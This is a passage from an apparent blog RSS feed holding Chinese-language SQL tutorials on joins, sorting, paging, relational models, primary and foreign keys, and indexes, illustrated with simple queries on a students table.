&lt;li&gt;LEFT OUTER JOIN则返回左表都存在的行。如果我们给students表增加一行，并添加class_id=5，由于classes表并不存在id=5的行，所以，LEFT OUTER JOIN的结果会增加一行，对应的class_name是NULL：&lt;/li&gt;
&lt;li&gt;FULL OUTER JOIN，它会把两张表的所有记录全部选择出来，并且，自动把对方不存在的列填充为NULL&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;7排序&#34;&gt;7.排序&lt;/h2&gt;
&lt;p&gt;我们使用ORDER BY语句进行排序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, name, gender, score &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; score;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以加上DESC表示“倒序”&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, name, gender, score &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; score &lt;span style=&#34;color:#66d9ef&#34;&gt;DESC&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果score列有相同的数据，要进一步排序，可以继续添加列名。例如，使用ORDER BY score DESC, gender表示先按score列倒序，如果有相同分数的，再按gender列排序：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, name, gender, score &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students &lt;span style=&#34;color:#66d9ef&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; score &lt;span style=&#34;color:#66d9ef&#34;&gt;DESC&lt;/span&gt;, gender;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;默认的排序规则是ASC：“升序”，即从小到大。ASC可以省略，即ORDER BY score ASC和ORDER BY score效果一样。&lt;/p&gt;
&lt;p&gt;如果有WHERE子句，那么ORDER BY子句要放到WHERE子句后面。例如，查询一班的学生成绩，并按照倒序排序：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, name, gender, score
&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students
&lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; class_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; score &lt;span style=&#34;color:#66d9ef&#34;&gt;DESC&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8分页&#34;&gt;8.分页&lt;/h2&gt;
&lt;p&gt;分页实际上就是从结果集中“截取”出第M~N条记录。这个查询可以通过LIMIT M OFFSET N子句实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, name, gender, score
&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students
&lt;span style=&#34;color:#66d9ef&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; score &lt;span style=&#34;color:#66d9ef&#34;&gt;DESC&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;LIMIT&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OFFSET&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述查询LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始&lt;/p&gt;
&lt;p&gt;如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; id, name, gender, score
&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; students
&lt;span style=&#34;color:#66d9ef&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;BY&lt;/span&gt; score &lt;span style=&#34;color:#66d9ef&#34;&gt;DESC&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;LIMIT&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OFFSET&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集。&lt;/li&gt;
&lt;li&gt;OFFSET是可选的，如果只写LIMIT 15，那么相当于LIMIT 15 OFFSET 0。&lt;/li&gt;
&lt;li&gt;在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15。&lt;/li&gt;
&lt;li&gt;使用LIMIT M OFFSET N 分页时，随着N越来越大，查询效率也会越来越低。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>SQL—数据库语言</title>
        <link>https://ac-lm.github.io/posts/sql/sql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E8%A8%80/</link>
        <pubDate>Sun, 27 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/sql/sql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E8%A8%80/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.liaoxuefeng.com/wiki/1177760294764384&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; SQL教程 @廖雪峰 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是sqlstructured-query-language&#34;&gt;1.什么是SQL(Structured Query Language)&lt;/h2&gt;
&lt;p&gt;SQL是结构化查询语言的缩写，用来访问和操作数据库系统。SQL语句既可以查询数据库中的数据，也可以添加、更新和删除数据库中的数据，还可以对数据库进行管理和维护操作。不同的数据库，都支持SQL，这样，我们通过学习SQL这一种语言，就可以操作各种不同的数据库。&lt;/p&gt;
&lt;p&gt;虽然SQL已经被ANSI组织定义为标准，不幸地是，各个不同的数据库对标准的SQL支持不太一致。并且，大部分数据库都在标准的SQL上做了扩展。也就是说，如果只使用标准SQL，理论上所有数据库都可以支持，但如果使用某个特定数据库的扩展SQL，换一个数据库就不能执行了。例如，Oracle把自己扩展的SQL称为PL/SQL，Microsoft把自己扩展的SQL称为T-SQL。&lt;/p&gt;
&lt;p&gt;现实情况是，如果我们只使用标准SQL的核心功能，那么所有数据库通常都可以执行。不常用的SQL功能，不同的数据库支持的程度都不一样。而各个数据库支持的各自扩展的功能，通常我们把它们称之为方言。&lt;/p&gt;
&lt;p&gt;总的来说，SQL语言定义了这么几种操作数据库的能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DDL(Data Definition Language)：DDL允许用户定义数据，也就是创建表、删除表、修改表结构这些操作。&lt;/li&gt;
&lt;li&gt;DML(Data Manipulation Language)：DML为用户提供添加、删除、更新数据的能力.&lt;/li&gt;
&lt;li&gt;DQL(Data Query Language):DQL允许用户查询数据，这也是通常最频繁的数据库日常操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PS: SQL语言关键字不区分大小写！但是，针对不同的数据库，对于表名和列名，有的数据库区分大小写，有的数据库不区分大小写&lt;/p&gt;
&lt;h2 id=&#34;2为什么需要数据库&#34;&gt;2.为什么需要数据库&lt;/h2&gt;
&lt;p&gt;因为应用程序需要保存用户的数据，比如Word需要把用户文档保存起来，以便下次继续编辑或者拷贝到另一台电脑。要保存用户的数据，一个最简单的方法是把用户数据写入文件。例如，要保存一个班级所有学生的信息，可以向文件中写入一个CSV文件；如果要保存学校所有班级的信息，可以写入另一个CSV文件。&lt;/p&gt;
&lt;p&gt;但是，随着应用程序的功能越来越复杂，数据量越来越大，如何管理这些数据就成了大问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读写文件并解析出数据需要大量重复代码；&lt;/li&gt;
&lt;li&gt;从成千上万的数据中快速查询出指定数据需要复杂的逻辑。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果每个应用程序都各自写自己的读写数据的代码，一方面效率低，容易出错，另一方面，每个应用程序访问数据的接口都不相同，数据难以复用。&lt;/p&gt;
&lt;p&gt;所以，数据库作为一种专门管理数据的软件就出现了。应用程序不需要自己管理数据，而是通过数据库软件提供的接口来读写数据。至于数据本身如何存储到文件，那是数据库软件的事情，应用程序自己并不关心，这样一来，编写应用程序的时候，数据读写的功能就被大大地简化了。&lt;/p&gt;
&lt;h2 id=&#34;3数据库模型&#34;&gt;3.数据库模型&lt;/h2&gt;
&lt;p&gt;数据库按照数据结构来组织、存储和管理数据，实际上，数据库一共有三种模型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;层次模型&lt;/li&gt;
&lt;li&gt;网状模型&lt;/li&gt;
&lt;li&gt;关系模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;层次模型就是以上下级的层次关系来组织数据的一种方式，层次模型的数据结构看起来就像一颗树：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;            ┌─────┐
            │     │
            └─────┘
               │
       ┌───────┴───────┐
       │               │
    ┌─────┐         ┌─────┐
    │     │         │     │
    └─────┘         └─────┘
       │               │
   ┌───┴───┐       ┌───┴───┐
   │       │       │       │
┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐
│     │ │     │ │     │ │     │
└─────┘ └─────┘ └─────┘ └─────┘
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;网状模型把每个数据节点和其他很多节点都连接起来，它的数据结构看起来就像很多城市之间的路网：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;     ┌─────┐      ┌─────┐
   ┌─│     │──────│     │──┐
   │ └─────┘      └─────┘  │
   │    │            │     │
   │    └──────┬─────┘     │
   │           │           │
┌─────┐     ┌─────┐     ┌─────┐
│     │─────│     │─────│     │
└─────┘     └─────┘     └─────┘
   │           │           │
   │     ┌─────┴─────┐     │
   │     │           │     │
   │  ┌─────┐     ┌─────┐  │
   └──│     │─────│     │──┘
      └─────┘     └─────┘
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关系模型把数据看作是一个二维表格，任何数据都可以通过行号+列号来唯一确定，它的数据模型看起来就是一个Excel表：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌─────┬─────┬─────┬─────┬─────┐
│     │     │     │     │     │
├─────┼─────┼─────┼─────┼─────┤
│     │     │     │     │     │
├─────┼─────┼─────┼─────┼─────┤
│     │     │     │     │     │
├─────┼─────┼─────┼─────┼─────┤
│     │     │     │     │     │
└─────┴─────┴─────┴─────┴─────┘
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;随着时间的推移和市场竞争，最终，基于关系模型的关系数据库获得了绝对市场份额。目前，主流的关系数据库主要分为以下几类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;商用数据库，例如：Oracle，SQL Server，DB2等&lt;/li&gt;
&lt;li&gt;开源数据库，例如：MySQL，PostgreSQL等&lt;/li&gt;
&lt;li&gt;桌面数据库，以微软Access为代表，适合桌面应用程序使用&lt;/li&gt;
&lt;li&gt;嵌入式数据库，以Sqlite为代表，适合手机应用和桌面程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4数据类型&#34;&gt;4.数据类型&lt;/h2&gt;
&lt;p&gt;对于一个关系表，除了定义每一列的名称外，还需要定义每一列的数据类型。关系数据库支持的标准数据类型包括数值、字符串、时间等：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;ID&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;姓名&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;班级ID&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;性别&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;年龄&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小明&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;201&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;M&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小红&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;202&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;F&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小军&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;202&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;M&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小白&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;201&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;F&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;9&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;上面的表中列举了最常用的数据类型。很多数据类型还有别名，例如，REAL又可以写成FLOAT(24)。还有一些不常用的数据类型，例如，TINYINT（范围在0~255）。各数据库厂商还会支持特定的数据类型，例如JSON。选择数据类型的时候，要根据业务规则选择合适的类型。通常来说，BIGINT能满足整数存储的需求，VARCHAR(N)能满足字符串存储的需求，这两种类型是使用最广泛的。&lt;/p&gt;
&lt;h2 id=&#34;5关系模型&#34;&gt;5.关系模型&lt;/h2&gt;
&lt;p&gt;关系数据库是建立在关系模型上的。而关系模型本质上就是若干个存储数据的二维表，可以把它们看作很多Excel表。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表的每一行称为记录（Record），记录是一个逻辑意义上的数据。&lt;/li&gt;
&lt;li&gt;表的每一列称为字段（Column），同一个表的每一行记录都拥有相同的若干字段。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;字段定义了数据类型（整型、浮点型、字符串、日期等），以及是否允许为NULL。注意NULL表示字段数据不存在。一个整型字段如果为NULL不表示它的值为0，同样的，一个字符串型字段为NULL也不表示它的值为空串。通常情况下，字段应该避免允许为NULL。不允许为NULL可以简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。&lt;/p&gt;
&lt;p&gt;关系数据库的表和表之间需要建立“一对多”，“多对一”和“一对一”的关系，这样才能够按照应用程序的逻辑来组织和存储数据。例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个班级表，每一行对应着一个班级，而一个班级对应着多个学生，班级表和学生表的关系就是“一对多”。&lt;/li&gt;
&lt;li&gt;反过来，我们先在学生表中定位了一行记录，要确定他的班级，学生表和班级表是“多对一”的关系。&lt;/li&gt;
&lt;li&gt;如果我们把班级表分拆得细一点，单独创建一个教师表，班级表只存储教师ID，这样，一个班级总是对应一个教师，班级表和教师表就是“一对一”关系。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6主键与外键与索引&#34;&gt;6.主键与外键与索引&lt;/h2&gt;
&lt;h3 id=&#34;主键&#34;&gt;主键&lt;/h3&gt;
&lt;p&gt;在关系数据库中，一张表中的每一行数据被称为一条记录。一条记录就是由多个字段组成的。对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一区分出不同的记录，这个字段被称为主键&lt;/p&gt;
&lt;p&gt;例如，假设我们把name字段作为主键，那么通过名字小明或小红就能唯一确定一条记录。但是，这么设定，就没法存储同名的同学了，因为插入相同主键的两条记录是不被允许的。&lt;/p&gt;
&lt;p&gt;对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。所以，选取主键的一个基本原则是：不使用任何业务相关的字段作为主键。&lt;/p&gt;
&lt;p&gt;作为主键最好是完全业务无关的字段，我们一般把这个字段命名为id。常见的可作为id字段的类型有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自增整数类型：数据库会在插入数据时自动为每一条记录分配一个自增整数，这样我们就完全不用担心主键重复，也不用自己预先生成主键，记录数约为2147483647（约21亿）&lt;/li&gt;
&lt;li&gt;全局唯一GUID类型：使用一种全局唯一的字符串作为主键，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。GUID算法通过网卡MAC地址、时间戳和随机数保证任意计算机在任意时间生成的字符串都是不同的，大部分编程语言都内置了GUID算法，可以自己预算出主键，记录数约922亿亿&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;联合主键&#34;&gt;联合主键&lt;/h3&gt;
&lt;p&gt;关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键，这种主键被称为联合主键。&lt;/p&gt;
&lt;p&gt;对于联合主键，允许一列有重复，只要不是所有主键列都重复即可：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;id_num&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;id_type&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;other columns&amp;hellip;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;A&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;A&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;B&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果我们把上述表的id_num和id_type这两列作为联合主键，那么上面的3条记录都是允许的，因为没有两列主键组合起来是相同的。没有必要的情况下，我们尽量不使用联合主键，因为它给关系表带来了复杂度的上升。&lt;/p&gt;
&lt;h3 id=&#34;外键&#34;&gt;外键&lt;/h3&gt;
&lt;p&gt;当我们用主键唯一标识记录时，我们就可以在students表中确定任意一个学生的记录，同时还可以在classes表中确定任意一个班级记录，但是我们如何确定students表的一条记录，例如，id=1的小明，属于哪个班级呢？&lt;/p&gt;
&lt;p&gt;为了表达这种一对多的关系，我们需要在students表中加入一列class_id，让它的值与classes表的某条记录相对应：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;id&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;class_id&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;name&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;other columns&amp;hellip;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小明&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小红&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;5&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小白&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;这样，我们就可以根据class_id这个列直接定位出一个students表的记录应该对应到classes的哪条记录。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小明的class_id是1，因此，对应的classes表的记录是id=1的一班&lt;/li&gt;
&lt;li&gt;小红的class_id是1，因此，对应的classes表的记录是id=1的一班&lt;/li&gt;
&lt;li&gt;小白的class_id是2，因此，对应的classes表的记录是id=2的二班&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在students表中，通过class_id的字段，可以把数据与另一张表关联起来，这种列称为外键。&lt;/p&gt;
&lt;p&gt;外键并不是通过列名实现的，而是通过定义外键约束实现的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ALTER TABLE students
ADD CONSTRAINT fk_class_id
FOREIGN KEY (class_id)
REFERENCES classes (id);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中，外键约束的名称fk_class_id可以任意，FOREIGN KEY (class_id)指定了class_id作为外键，REFERENCES classes (id)指定了这个外键将关联到classes表的id列（即classes表的主键）。&lt;/p&gt;
&lt;p&gt;通过定义外键约束，关系数据库可以保证无法插入无效的数据。即如果classes表不存在id=99的记录，students表就无法插入class_id=99的记录。&lt;/p&gt;
&lt;p&gt;由于外键约束会降低数据库的性能，大部分互联网应用程序为了追求速度，并不设置外键约束，而是仅靠应用程序自身来保证逻辑的正确性。这种情况下，class_id仅仅是一个普通的列，只是它起到了外键的作用而已。&lt;/p&gt;
&lt;p&gt;要删除一个外键约束，也是通过ALTER TABLE实现的：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ALTER TABLE students
DROP FOREIGN KEY fk_class_id;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：删除外键约束并没有删除外键这一列。删除列是通过DROP COLUMN &amp;hellip;实现的。&lt;/p&gt;
&lt;h3 id=&#34;索引&#34;&gt;索引&lt;/h3&gt;
&lt;p&gt;在关系数据库中，如果有上万甚至上亿条记录，在查找记录的时候，想要获得非常快的速度，就需要使用索引。&lt;/p&gt;
&lt;p&gt;索引是关系数据库中对某一列或多个列的值进行预排序的数据结构。通过使用索引，可以让数据库系统不必扫描整个表，而是直接定位到符合条件的记录，这样就大大加快了查询速度。&lt;/p&gt;
&lt;p&gt;例如，对于students表：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;id&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;class_id&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;name&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;gender&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;score&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小明&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;M&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;90&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小红&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;F&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;小军&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;M&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;88&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果要经常根据score列进行查询，就可以对score列创建索引：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ALTER TABLE students
ADD INDEX idx_score (score);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用ADD INDEX idx_score (score)就创建了一个名称为idx_score，使用列score的索引。索引名称是任意的，索引如果有多列，可以在括号里依次写上，例如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ALTER TABLE students
ADD INDEX idx_name_score (name, score);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;索引的效率取决于索引列的值是否散列，即该列的值如果越互不相同，那么索引效率越高。反过来，如果记录的列存在大量相同的值，例如gender列，大约一半的记录值是M，另一半是F，因此，对该列创建索引就没有意义。&lt;/p&gt;
&lt;p&gt;可以对一张表创建多个索引。索引的优点是提高了查询效率，缺点是在插入、更新和删除记录时，需要同时修改索引，因此，索引越多，插入、更新和删除记录的速度就越慢。&lt;/p&gt;
&lt;p&gt;对于主键，关系数据库会自动对其创建主键索引。使用主键索引的效率是最高的，因为主键会保证绝对唯一。&lt;/p&gt;
&lt;h3 id=&#34;唯一索引&#34;&gt;唯一索引&lt;/h3&gt;
&lt;p&gt;在设计关系数据表的时候，看上去唯一的列，例如身份证号、邮箱地址等，因为他们具有业务含义，因此不宜作为主键。&lt;/p&gt;
&lt;p&gt;但是，这些列根据业务要求，又具有唯一性约束：即不能出现两条记录存储了同一个身份证号。这个时候，就可以给该列添加一个唯一索引。例如，我们假设students表的name不能重复：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ALTER TABLE students
ADD UNIQUE INDEX uni_name (name);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过UNIQUE关键字我们就添加了一个唯一索引。&lt;/p&gt;
